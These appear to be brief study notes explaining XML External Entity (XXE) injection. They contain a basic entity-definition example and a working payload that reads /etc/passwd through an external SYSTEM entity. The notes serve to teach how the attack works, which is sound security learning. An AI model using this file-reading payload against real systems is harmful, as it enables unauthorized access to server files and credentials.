- XML External Entity attacks typically happen when we send in a payload of just simple XML such as
	- `<!DOCTYPE replace [<!ENTITY name "feast"> ]>  
	  <userInfo>  
	  <firstName>falcon</firstName>  
	  <lastName>&name;</lastName>  
	 </userInfo>`
- That payload defines an entity called name and assigns it a value of feast.
- You can also use XXE to read a file from the system using a payload such as
	- `<?xml version="1.0"?>  
		<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>  
		<root>&read;</root>`
- That payload defines an entity called read but then sets it to the value of SYSTEM and the path of the file you want to read. If the web app is vulnerable it should display the contents of /etc/passwd
- Remember that you won't be able to ls so you are only going to be able to read actual files
